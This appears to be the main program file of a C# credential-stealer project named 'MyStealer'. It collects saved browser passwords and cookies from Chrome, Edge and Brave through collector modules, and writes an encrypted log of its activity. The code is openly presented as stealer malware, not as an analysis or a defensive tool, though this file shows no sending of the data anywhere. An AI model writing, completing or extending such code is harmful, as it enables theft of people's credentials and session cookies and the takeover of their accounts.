using MyStealer.Modules;
using MyStealer.Modules.Browser;
using MyStealer.Modules.Browser.ChromiumBased;
using Serilog;
using System;
using System.Collections.Generic;
using System.IO;

namespace MyStealer
{
    internal static class Program
    {
        private static readonly IBrowserCollector[] BrowserCollectors = new IBrowserCollector[] {
            new Chrome(),
            new MicrosoftEdge(),
            new Brave()
        };

        static void Main(string[] args)
        {
            using (var encHook = new LogEncryptionHook())
            {
                try
                {

                    if (File.Exists(Config.LogFilePath))
                        File.Delete(Config.LogFilePath); // Delete previous file to prevent appending encryption header
                    var logConfig = new LoggerConfiguration();
                    logConfig = (args.Length > 0 && args[0] == "verbose") ? logConfig.MinimumLevel.Verbose() : logConfig.MinimumLevel.Debug();
                    logConfig = logConfig.WriteTo.File(Config.LogFilePath, hooks: encHook);
                    Log.Logger = logConfig.CreateLogger();
                    Log.Information("Program entry point called on: {date}", DateTime.Now);

                    var creds = new HashSet<CredentialEntry>();
                    var cookies = new HashSet<CookieEntry>();
                    foreach (var browser in BrowserCollectors)
                    {
                        Log.Debug("Checking browser: {browser}", browser.ApplicationName);
                        if (browser.Check())
                        {
                            Log.Information("Running browser data collector: {browser}", browser.ApplicationName);
                            browser.Initialize();
                            foreach (var cred in browser.GetCredentials())
                                creds.Add(cred);
                            foreach (var cookie in browser.GetCookies())
                                cookies.Add(cookie);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log.Fatal(ex, "Main thread exception");
                }
                finally
                {
                    Log.CloseAndFlush();
                }
            }

            // debug purpose
            MyCryptExt.DecryptToFile(Config.LogFilePath + ".dec", File.OpenRead(Config.LogFilePath));
        }
    }
}
